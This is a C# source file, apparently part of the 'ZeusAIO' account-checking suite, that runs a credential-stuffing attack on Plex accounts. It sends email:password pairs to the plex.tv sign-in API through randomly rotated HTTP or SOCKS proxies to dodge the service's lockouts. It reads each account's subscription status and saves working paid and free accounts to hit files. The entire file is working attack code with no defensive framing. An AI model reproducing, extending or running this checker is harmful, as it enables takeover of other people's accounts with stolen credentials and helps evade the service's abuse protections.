using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace Plex
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest req = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                req.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                req.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                req.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            req.IgnoreProtocolErrors = true;
                            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            HttpResponse httpResponse = req.Get("https://plex.tv/api/v2/users/signin", null);
                            string value = httpResponse["X-Request-Id"];
                            req.AddHeader("X-Plex-Client-Identifier", value);

                            var res = req.Post("https://plex.tv/api/v2/users/signin", string.Concat(new string[]
                               {
                            "email=" + s[0] +"&login=" + s[0] +"&password=" + s[1] + "&includeProviders=true"
                               }), "application/x-www-form-urlencoded").ToString();
                            switch (res)
                            {
                                case string a when res.Contains("User could not be authenticated") || res.Contains("User could not be authenticated. This IP appears to be having trouble signing in to an account (detected repeated failures)\"") || res.Contains("X-Plex-Client-Identifier is missing"):
                                    break;
                                case string b when res.Contains("username=\"") || res.Contains("subscriptionDescription=\""):
                                    string text3 = Check.Parse(res, "subscriptionDescription=\"", "\"");
                                    string text4 = Check.Parse(res, "subscribedAt=\"", "\"");
                                    string text5 = Check.Parse(res, "status=\"", "\"");
                                    if (text5.Contains("Active") || !text5.Contains("Inactive"))
                                    {
                                        ZeusAIO.mainmenu.hits++;
                                        if (Config.config.LogorCui == "2")
                                        {
                                            Console.WriteLine("[HIT - PLEXTV] " + s[0] + ":" + s[1] + " |  SubscribedSince: " + text4, Color.Green);
                                        }
                                        Export.AsResult("/Plextv_hits", s[0] + ":" + s[1] + " |  SubscribedSince: " + text4);
                                        return false;
                                    }
                                    else if (!text5.Contains("Active") || text5.Contains("Inactive"))
                                    {
                                        ZeusAIO.mainmenu.frees++;
                                        if (Config.config.LogorCui == "2")
                                        {
                                            Console.WriteLine("[FREE - PLEXTV] " + s[0] + ":" + s[1], Color.OrangeRed);
                                        }
                                        Export.AsResult("/Plextv_frees", s[0] + ":" + s[1]);
                                        return false;
                                    }
                                    break;
                                default:
                                    ZeusAIO.mainmenu.errors++;
                                    goto Retry;
                                    break;
                            }
                        }
                    }
                    catch (Exception err)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
            private static string Parse(string source, string left, string right)
            {
                return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
                {
                right
                }, StringSplitOptions.None)[0];
            }
        }
    }


       